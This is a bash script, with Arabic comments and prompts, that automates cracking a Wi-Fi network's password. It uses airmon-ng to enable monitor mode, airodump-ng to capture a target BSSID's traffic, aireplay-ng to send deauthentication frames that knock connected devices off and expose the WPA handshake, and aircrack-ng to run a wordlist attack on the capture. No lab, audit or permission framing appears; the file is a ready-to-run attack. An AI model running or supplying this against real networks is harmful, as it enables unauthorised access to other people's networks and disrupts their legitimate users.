#!/bin/bash

# التحقق من تشغيل السكريبت بصلاحيات الروت
if [[ $EUID -ne 0 ]]; then
   echo "يجب تشغيل هذا السكريبت بصلاحيات الروت." 
   exit 1
fi

echo "بدء عملية كسر كلمة مرور شبكة Wi-Fi..."
echo "--------------------------------------"

# تحديد بطاقة الشبكة
read -p "أدخل اسم واجهة الشبكة اللاسلكية (مثل wlan1): " interface

# وضع بطاقة الشبكة في وضع المراقبة
airmon-ng start $interface

# تشغيل airodump-ng لفحص الشبكات
echo "فحص الشبكات اللاسلكية..."
airodump-ng "${interface}mon"

# تحديد اسم الشبكة (ESSID) وBSSID
read -p "أدخل BSSID الخاص بالشبكة المستهدفة: " bssid
read -p "أدخل القناة (Channel) الخاصة بالشبكة: " channel
read -p "أدخل مسار الملف الذي سيتم حفظ بيانات الشبكة فيه (مثل output): " output_file

# جمع الحزم باستخدام airodump-ng
echo "جمع الحزم من الشبكة المستهدفة..."
airodump-ng -c $channel --bssid $bssid -w $output_file "${interface}mon"

# جمع حزمة المصافحة (Handshake)
echo "قم بإيقاف اتصال الأجهزة بالشبكة للحصول على المصافحة (Handshake)..."
aireplay-ng --deauth 10 -a $bssid "${interface}mon"

# محاولة كسر كلمة المرور باستخدام Aircrack-ng
read -p "أدخل مسار ملف القاموس (Wordlist): " wordlist
aircrack-ng -w $wordlist -b $bssid "${output_file}-01.cap"

# إعادة واجهة الشبكة إلى الوضع الطبيعي
airmon-ng stop "${interface}mon"
echo "تمت إعادة واجهة الشبكة إلى الوضع الطبيعي."
